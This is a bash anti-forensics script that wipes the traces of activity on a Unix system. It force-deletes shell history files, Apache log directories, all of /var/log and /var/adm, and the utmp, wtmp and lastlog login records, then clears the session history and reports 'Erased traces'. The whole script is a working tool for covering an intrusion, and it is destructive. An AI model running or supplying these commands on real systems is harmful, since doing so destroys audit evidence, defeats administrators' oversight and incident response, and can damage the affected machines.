#!/bin/bash

stty -echo
rm -rf "${HISTFILE}" 2> /dev/null
rm -rf /root/.bash_history 2> /dev/null
rm -rf /root/.ksh_history 2> /dev/null
rm -rf /root/.bash_logout 2> /dev/null
rm -rf /home/"${USER}"/.bash_logout 2> /dev/null
rm -rf /usr/local/apache/logs 2> /dev/null
rm -rf /usr/local/apache/log 2> /dev/null
rm -rf /var/apache/logs 2> /dev/null
rm -rf /var/apache/log 2> /dev/null
rm -rf /var/run/utmp 2> /dev/null
rm -rf /var/logs 2> /dev/null
rm -rf /var/log 2> /dev/null
rm -rf /var/adm 2> /dev/null
rm -rf /etc/wtmp 2> /dev/null
rm -rf /etc/utmp 2> /dev/null
rm -rf /var/log/lastlog 2> /dev/null
rm -rf /var/log/wtmp 2> /dev/null
rm -rf /tmp/logs 2> /dev/null
history -c 2> /dev/null

if [[ $(id -u) = 0 ]]; then
  echo "Erased traces"
else
  echo "Erased some traces, run as root to erase all traces"
fi

stty echo
